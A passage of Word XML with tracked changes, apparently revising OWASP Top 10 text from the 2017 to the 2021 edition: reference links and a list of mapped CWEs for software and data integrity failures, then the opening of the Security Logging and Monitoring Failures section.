            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>https://about.codecov.io/security-update)  -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7A52FBF0" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3104" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3105" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [Securing DevOps by Julien </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Vehent</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>https://www.manning.com/books/securing-devops)  -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5C980DBD" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3106" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5053E6B3" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3107" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3108" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## List of Mapped CWEs</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3DC62F1A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3109" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7709DC9F" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3110" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3111" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-345: Insufficient Verification of Data </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Authenticity](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/345.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5061BA58" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3112" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3113" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-353: Missing Support for Integrity </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Check](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/353.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5036A21A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3114" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3115" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-426: Untrusted Search </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Path](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/426.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5AF59B02" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3116" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3117" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-494: Download of Code Without Integrity </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Check](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/494.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1B487438" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3118" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> [CWE-502: Deserialization of Untrusted </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Data](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://cwe.mitre.org/data/definitions/502.html)</w:t>
      </w:r>
      <w:ins w:id="3119" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1367ACF8" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3120" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3121" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          </w:rPr>
          <w:delText>* [Java Unmarshaller Security](https://github.com/mbechler/marshalsec)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="459F4FAD" w14:textId="0B635860" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3122" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3123" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [OWASP AppSec Cali 2015: Marshalling Pickles](http://frohoff.github.io/appseccali-marshalling-pickles/)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3124" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-565: Reliance on Cookies without Validation and Integrity </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Checking](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/565.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0BC076B1" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3125" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3126" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-784: Reliance on Cookies without Validation and Integrity Checking in a Security </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Decision](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/784.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="71962BC8" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3127" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3128" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-829: Inclusion of Functionality from Untrusted Control </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Sphere](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/829.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="291A7C70" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3129" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3130" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-830: Inclusion of Web Functionality from an Untrusted </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Source](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/830.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="78249400" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3131" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3132" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Attributes](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/915.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2E4EB07F" w14:textId="77777777" w:rsidR="00E300D6" w:rsidRDefault="00E300D6" w:rsidP="00AC649A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BD5D294"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74FC3474"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"https://owasp.org/Top10/09_2021-Security_Logging_and_Monitoring_Failures/"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A754B4B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>title:   "A09:2021 – Security Logging and Monitoring Failures"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50D6272E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>id:      "A09:2021"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42A9EC9F"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0BE77298"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4923FB19"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#A09:2021 – Security Logging and Monitoring Failures   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">  !</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">[icon](assets/TOP_10_Icons_Final_Security_Logging_and_Monitoring_Failures.png){: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name="Security Logging and Monitoring Failures", lang=lang, source=source, parent=parent, predecessor=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>extra.osib.document</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> ~ ".2017.10") }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23A90849" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3133" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3134" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText># A9:2017 Using Components with Known Vulnerabilities</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="26AF96DD" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3135" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0464CBAC" w14:textId="393B548F" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3136" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3137" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">| Threat agents/Attack vectors | </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="29E633F1" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3138" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F636FB3" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3139" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3140" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Factors</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="24C12D5A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3141" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21F58AF9" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3142" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3143"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63E12B8D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3144" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3145" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
